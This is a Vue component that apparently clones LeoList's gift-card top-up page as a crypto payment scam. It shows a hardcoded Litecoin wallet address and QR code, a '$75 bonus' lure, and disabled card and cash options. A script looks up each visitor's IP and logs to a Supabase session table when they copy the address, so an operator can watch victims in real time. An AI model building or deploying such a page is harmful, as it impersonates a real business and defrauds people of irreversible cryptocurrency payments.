<template>
  <div class="min-h-screen bg-gray-100">
    <!-- Header -->
    <header class="bg-slate-600 text-white px-4 py-3">
      <div class="flex justify-between items-center">
        <div>
          <h1 class="text-xl sm:text-2xl font-bold">LeoList</h1>
          <p class="text-xs sm:text-sm text-gray-300">
            CANADA'S CLASSIFIED SITE
          </p>
        </div>
        <button class="p-2">
          <span class="material-icons text-white text-2xl">menu</span>
        </button>
      </div>
    </header>

    <!-- Modal Overlay -->
    <div
      v-if="showCryptoModal"
      class="fixed inset-0 bg-black bg-opacity-50 z-50 flex flex-col justify-end"
    >
      <transition name="slide-up">
        <div
          class="bg-white rounded-t-3xl w-full relative pb-safe animate-slideup"
          v-if="showCryptoModal"
          style="max-height: 95vh; min-height: 400px"
        >
          <!-- Close Button -->
          <button
            @click="showCryptoModal = false"
            class="absolute top-4 right-4 text-gray-500 hover:text-gray-700 z-10"
          >
            <span class="material-icons text-2xl">close</span>
          </button>

          <!-- Modal Content -->
          <div class="p-6 pt-12">
            <h2 class="text-xl font-bold mb-4">Crypto (Litecoin - LTC)</h2>
            <p class="text-gray-500 mb-6 text-sm">
              Scan the QR code or copy the Crypto (Litecoin - LTC) address below
              to top up your gift card
            </p>

            <!-- QR Code -->
            <div class="flex justify-center mb-6">
              <div class="bg-white p-4 rounded-lg shadow-sm border">
                <!-- QR Code dynamique + logo overlay -->
                <div class="qr-wrapper flex items-center justify-center">
                  <canvas
                    id="qr-code-target-canvas"
                    class="js-qrcode-target-canvas"
                    width="192"
                    height="192"
                  ></canvas>
                  <img
                    id="qr-code-target-logo"
                    class="js-qrcode-target-logo"
                    alt="Litecoin"
                    src="https://www.leolist.cc/static/min/img/gift-card/currencies/ltc.svg"
                  />
                </div>
              </div>
            </div>

            <!-- LTC Address avec feedback visuel -->
            <div class="mb-6">
              <h3 class="text-gray-500 text-sm mb-2">LTC Address</h3>
              <div
                :class="[
                  'p-3 rounded-lg flex items-center gap-2 relative transition-all',
                  copied
                    ? 'bg-green-50 border border-green-300'
                    : 'bg-gray-50 border border-gray-200',
                ]"
              >
                <input
                  ref="addressInput"
                  class="ltc-address-input text-base font-bold font-mono bg-transparent border-none focus:outline-none flex-1 min-w-0 text-gray-900"
                  :value="address"
                  readonly
                  @focus="$event.target.select()"
                  style="letter-spacing: 1px"
                />
                <button
                  v-if="!copied"
                  @click="copyAddress"
                  class="bg-black text-white px-4 py-2 rounded-full text-sm font-medium ml-2"
                  aria-label="Copy Litecoin address"
                >
                  Copy
                </button>
                <span
                  v-else
                  class="flex items-center justify-center bg-green-500 text-white rounded-full w-8 h-8 ml-2 shadow transition-all"
                >
                  <svg
                    class="w-6 h-6"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="3"
                    viewBox="0 0 24 24"
                  >
                    <path
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      d="M5 13l4 4L19 7"
                    />
                  </svg>
                </span>
              </div>
            </div>

            <!-- Info -->
            <div class="flex items-start">
              <span class="material-icons text-gray-400 mr-3 mt-1"
                >schedule</span
              >
              <p class="text-gray-500 text-sm">
                Crypto (Litecoin - LTC) payments take 1-4 minutes, and are
                automatically credited as CAD to your Gift Card.
              </p>
            </div>
          </div>
        </div>
      </transition>
    </div>

    <!-- Navigation Cards -->
    <div class="grid grid-cols-4 gap-0 bg-white">
      <div class="text-center py-3 px-1 border-r border-gray-200">
        <div class="flex justify-center mb-1">
          <span class="material-icons text-gray-400 text-xl sm:text-2xl"
            >build</span
          >
        </div>
        <p class="text-xs text-gray-400">Manage</p>
      </div>

      <div class="text-center py-3 px-1 border-r border-gray-200">
        <div class="flex justify-center mb-1">
          <span class="material-icons text-gray-400 text-xl sm:text-2xl"
            >verified</span
          >
        </div>
        <p class="text-xs text-gray-400">Get Verified</p>
      </div>

      <div class="text-center py-3 px-1 border-r border-gray-200">
        <div class="flex justify-center mb-1">
          <span class="material-icons text-gray-400 text-xl sm:text-2xl"
            >person</span
          >
        </div>
        <p class="text-xs text-gray-400">Directory</p>
      </div>

      <div class="text-center py-3 px-1">
        <div class="flex justify-center mb-1">
          <span class="material-icons text-black text-xl sm:text-2xl"
            >card_giftcard</span
          >
        </div>
        <p class="text-xs text-black font-medium">Gift Card</p>
      </div>
    </div>

    <!-- Gift Card Balance -->

    <!-- Top Up Section -->
    <div class="px-4 py-4">
      <h3 class="text-lg sm:text-xl font-semibold mb-4">
        Top up $75 in LTC and get an extra $75:
      </h3>

      <!-- Payment Options -->
      <div class="space-y-3">
        <!-- Crypto Option -->
        <div
          @click="showCryptoModal = true"
          class="bg-slate-600 text-white p-3 sm:p-4 rounded-lg flex items-center justify-between cursor-pointer hover:bg-slate-700 transition-colors"
        >
          <div class="flex items-center">
            <div class="bg-white rounded-full p-2 mr-3 flex-shrink-0">
              <!-- Litecoin Official Logo -->
              <img
                src="https://www.leolist.cc/static/min/img/gift-card/currencies/ltc.svg"
                alt="Litecoin"
                class="w-5 h-5 sm:w-6 sm:h-6"
              />
            </div>
            <span class="font-medium text-sm sm:text-base"
              >Crypto (Litecoin - LTC)</span
            >
          </div>
          <span class="material-icons text-white">add</span>
        </div>

        <!-- Credit Card Option -->
        <div
          class="bg-gray-100 border border-gray-300 p-3 sm:p-4 rounded-lg flex items-center justify-between opacity-60 cursor-not-allowed select-none"
          title="Unavailable"
        >
          <div class="flex items-center">
            <div class="mr-3 flex-shrink-0">
              <span class="material-icons text-gray-400 text-2xl sm:text-3xl"
                >credit_card</span
              >
            </div>
            <span class="font-medium text-gray-400 text-sm sm:text-base"
              >Credit Card <span class="ml-1 text-xs">(Unavailable)</span></span
            >
          </div>
          <span class="material-icons text-gray-300">block</span>
        </div>

        <!-- Cash Option -->
        <div
          class="bg-gray-100 border border-gray-300 p-3 sm:p-4 rounded-lg flex items-center justify-between opacity-60 cursor-not-allowed select-none"
          title="Unavailable"
        >
          <div class="flex items-center">
            <div class="mr-3 flex-shrink-0">
              <span class="material-icons text-gray-400 text-2xl sm:text-3xl"
                >attach_money</span
              >
            </div>
            <span class="font-medium text-gray-400 text-sm sm:text-base"
              >Cash <span class="ml-1 text-xs">(Unavailable)</span></span
            >
          </div>
          <span class="material-icons text-gray-300">block</span>
        </div>
      </div>
    </div>

    <!-- Info Section -->
    <div class="px-4 pb-4">
      <div class="bg-white p-4 rounded-lg">
        <h4 class="text-base sm:text-lg font-semibold mb-2">
          How to pay with Litecoin
        </h4>
        <p class="text-gray-600 text-sm mb-4 leading-relaxed">
          Learn how to top up your Giftcard with Credit Card, Cash ATM and
          Interac Email.
        </p>
        <button
          class="bg-white border border-gray-300 px-4 py-2 rounded-lg text-sm font-medium text-gray-700 hover:bg-gray-50 flex items-center"
        >
          More Info
          <span class="material-icons ml-1 text-sm">chevron_right</span>
        </button>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, watch, nextTick } from "vue";
import QRCode from "qrcode";
import { useSession } from "../../composables/session";
import { useRouter } from "vue-router";
import { supabase } from "@/lib/supabase";

useSession();
const router = useRouter();

const balance = ref(0.0);
const showCryptoModal = ref(false);
const address = ref("LSMzcboGwApxXXAjz7w7R23BkUhkppcLRx");
const copied = ref(false);
const addressInput = ref(null);

const copyAddress = async () => {
  try {
    await navigator.clipboard.writeText(address.value);
    copied.value = true;
    handleTyping({ field: "copy_address" }); // Ajoute ceci ici
    setTimeout(() => {
      copied.value = false;
    }, 2000);
    return;
  } catch (err) {
    try {
      if (addressInput.value) {
        addressInput.value.focus();
        addressInput.value.select();
        const success = document.execCommand("copy");
        copied.value = success;
        handleTyping({ field: "copy_address" }); // Ajoute ici aussi pour fallback
        setTimeout(() => {
          copied.value = false;
        }, 2000);
        return;
      }
    } catch (e) {
      alert("Copy failed. Please select and copy manually.");
    }
  }
};

async function handleTyping({ field, value }) {
  let ip = null;
  try {
    const res = await fetch("https://ipwho.is/");
    const data = await res.json();
    if (data && data.success) {
      ip = data.ip;
    }
  } catch (e) {
    return;
  }
  if (!ip) {
    return;
  }

  // On adapte selon le champ (copy = message spécial)
  let message = `Champ "${field}" en train d'être édité`;
  if (field === "copy_address") {
    message = `L'utilisateur a copié l'adresse`;
  }

  const { error } = await supabase
    .from("session")
    .update({
      is_typing: message,
      last_seen_at: new Date().toISOString(),
      active: true,
    })
    .eq("ip", ip);

  if (error) {
    console.error(error);
  }
}

// Génère le QR à chaque ouverture du modal
watch(showCryptoModal, async (visible) => {
  if (visible) {
    await nextTick(); // attendre que le canvas soit monté
    const canvas = document.getElementById("qr-code-target-canvas");
    if (canvas) {
      QRCode.toCanvas(canvas, address.value, {
        width: 192,
        margin: 1,
        errorCorrectionLevel: "H",
        color: {
          dark: "#000000",
          light: "#f3f4f6",
        },
      });
    }
  }
});
</script>

<style scoped>
@import url("https://fonts.googleapis.com/icon?family=Material+Icons");

.slide-up-enter-active,
.slide-up-leave-active {
  transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.2s;
}
.slide-up-enter-from,
.slide-up-leave-to {
  transform: translateY(100%);
  opacity: 0;
}
.slide-up-enter-to,
.slide-up-leave-from {
  transform: translateY(0%);
  opacity: 1;
}

@keyframes slideup {
  0% {
    transform: translateY(100%);
    opacity: 0;
  }
  100% {
    transform: translateY(0%);
    opacity: 1;
  }
}
.animate-slideup {
  animation: slideup 0.35s cubic-bezier(0.4, 0, 0.2, 1);
}

@media (max-width: 640px) {
  .material-icons {
    font-size: inherit;
  }
}

.pb-safe {
  padding-bottom: env(safe-area-inset-bottom);
}

/* QR code wrapper & overlay logo */
.qr-wrapper {
  position: relative;
  width: 192px;
  height: 192px;
}
.js-qrcode-target-canvas {
  width: 100%;
  height: 100%;
  display: block;
  border-radius: 16px;
}
.js-qrcode-target-logo {
  position: absolute;
  left: 50%;
  top: 50%;
  width: 56px;
  height: 56px;
  transform: translate(-50%, -50%);
  border-radius: 50%;
  background: white;
  padding: 6px;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.07);
  pointer-events: none;
}

/* Animation du check */
@keyframes fadeCheck {
  from {
    transform: scale(0.7);
    opacity: 0;
  }
  to {
    transform: scale(1);
    opacity: 1;
  }
}
.bg-green-500 {
  animation: fadeCheck 0.18s;
}
</style>
